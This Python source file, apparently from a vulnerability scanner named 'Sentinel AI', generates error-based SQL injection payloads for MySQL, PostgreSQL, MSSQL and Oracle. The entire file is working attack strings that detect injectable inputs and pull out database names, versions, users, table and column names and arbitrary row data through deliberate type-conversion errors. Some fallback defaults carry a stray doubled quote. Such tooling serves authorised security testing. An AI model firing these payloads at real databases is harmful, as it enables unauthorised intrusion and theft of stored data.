"""
===========================================================
Project : Sentinel AI
Module  : Error-Based SQL Injection Payloads
File ID : SCANNER-ERROR-PAYLOADS-001
Version : 1.0.0
===========================================================

Description:
Generates DBMS-specific error-based SQL injection payloads.
Supports MySQL, PostgreSQL, MSSQL, and Oracle.
"""

from __future__ import annotations


class ErrorPayloadGenerator:
    """
    Generates DBMS-specific payloads for Error-Based SQL Injection.
    """

    # ============================================================
    # Error Detection Payloads
    # ============================================================

    ERROR_DETECTION = {
        "MySQL": {
            "single_quote": "'",
            "double_quote": '"',
            "comment": "'-- -",
            "syntax": "' AND 1=1-- -",
            "error_trigger": "' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))-- -",
        },
        "PostgreSQL": {
            "single_quote": "'",
            "double_quote": '"',
            "comment": "'--",
            "syntax": "' AND 1=1--",
            "error_trigger": "' AND 1=CAST(version() AS int)--",
        },
        "MSSQL": {
            "single_quote": "'",
            "double_quote": '"',
            "comment": "'--",
            "syntax": "' AND 1=1--",
            "error_trigger": "' AND 1=CONVERT(int, @@version)--",
        },
        "Oracle": {
            "single_quote": "'",
            "double_quote": '"',
            "comment": "'--",
            "syntax": "' AND 1=1--",
            "error_trigger": "' AND 1=TO_NUMBER(version)--",
        },
    }

    # ============================================================
    # Error-Based Extraction Payloads
    # ============================================================
    ERROR_EXTRACTION = {
        "MySQL": {
            "database": "' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))-- -",
            "version": "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -",
            "user": "' AND EXTRACTVALUE(1, CONCAT(0x7e, USER()))-- -",
            "tables": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {0})))-- -",
            "columns": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='{0}' LIMIT 1 OFFSET {1})))-- -",
            "data": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT {0} FROM {1} LIMIT 1 OFFSET {2})))-- -",
        },
        "PostgreSQL": {
            "database": "' AND 1=CAST(current_database() AS int)--",
            "version": "' AND 1=CAST(version() AS int)--",
            "user": "' AND 1=CAST(current_user AS int)--",
            "tables": "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1 OFFSET {0}) AS int)--",
            "columns": "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='{0}' LIMIT 1 OFFSET {1}) AS int)--",
            "data": "' AND 1=CAST((SELECT {0} FROM {1} LIMIT 1 OFFSET {2}) AS int)--",
        },
        "MSSQL": {
            "database": "' AND 1=CONVERT(int, DB_NAME())--",
            "version": "' AND 1=CONVERT(int, @@VERSION)--",
            "user": "' AND 1=CONVERT(int, SYSTEM_USER)--",
            "tables": "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {0} ROWS FETCH NEXT 1 ROWS ONLY))--",
            "columns": "' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns WHERE table_name='{0}' ORDER BY column_name OFFSET {1} ROWS FETCH NEXT 1 ROWS ONLY))--",
            "data": "' AND 1=CONVERT(int, (SELECT {0} FROM {1} ORDER BY 1 OFFSET {2} ROWS FETCH NEXT 1 ROWS ONLY))--",
        },
        "Oracle": {
            "database": "' AND 1=TO_NUMBER(SYS_CONTEXT('USERENV','DB_NAME'))--",
            "version": "' AND 1=TO_NUMBER((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1))--",
            "user": "' AND 1=TO_NUMBER(USER)--",
            "tables": "' AND 1=TO_NUMBER((SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1 AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<={0})))--",
            "columns": "' AND 1=TO_NUMBER((SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{0}' AND ROWNUM=1 AND COLUMN_NAME NOT IN (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{0}' AND ROWNUM<={1})))--",
            "data": "' AND 1=TO_NUMBER((SELECT {0} FROM {1} WHERE ROWNUM=1 AND {0} NOT IN (SELECT {0} FROM {1} WHERE ROWNUM<={2})))--",
        },
    }

    def __init__(self, dbms: str = "MySQL"):
        self.dbms = dbms
        self._detection = self.ERROR_DETECTION.get(dbms, self.ERROR_DETECTION["MySQL"])
        self._extraction = self.ERROR_EXTRACTION.get(
            dbms, self.ERROR_EXTRACTION["MySQL"]
        )

    def get_single_quote_payload(self) -> str:
        """Get single quote payload for error detection."""
        return self._detection.get("single_quote", "'")

    def get_double_quote_payload(self) -> str:
        """Get double quote payload for error detection."""
        return self._detection.get("double_quote", '"')

    def get_syntax_payload(self) -> str:
        """Get syntax payload for error detection."""
        return self._detection.get("syntax", "' AND 1=1-- -")

    def get_error_trigger_payload(self) -> str:
        """Get error trigger payload."""
        return self._detection.get(
            "error_trigger", "' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))-- -"
        )

    def get_database_payload(self) -> str:
        """Get database extraction payload."""
        return self._extraction.get(
            "database", "' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))-- -"
        )

    def get_version_payload(self) -> str:
        """Get version extraction payload."""
        return self._extraction.get(
            "version", "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -"
        )

    def get_user_payload(self) -> str:
        """Get user extraction payload."""
        return self._extraction.get(
            "user", "' AND EXTRACTVALUE(1, CONCAT(0x7e, USER()))-- -"
        )

    def get_tables_payload(self, offset: int = 0) -> str:
        """Get tables extraction payload."""
        return self._extraction.get(
            "tables",
            "'' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {0})))-- -",
        ).format(offset)

    def get_columns_payload(self, table: str, offset: int = 0) -> str:
        """Get columns extraction payload."""
        return self._extraction.get(
            "columns",
            "'' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='{0}' LIMIT 1 OFFSET {1})))-- -",
        ).format(table, offset)

    def get_data_payload(self, column: str, table: str, offset: int = 0) -> str:
        """Get data extraction payload."""
        return self._extraction.get(
            "data",
            "'' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT {0} FROM {1} LIMIT 1 OFFSET {2})))-- -",
        ).format(column, table, offset)


def create_error_payload_generator(dbms: str = "MySQL") -> ErrorPayloadGenerator:
    """Factory function for ErrorPayloadGenerator."""
    return ErrorPayloadGenerator(dbms)
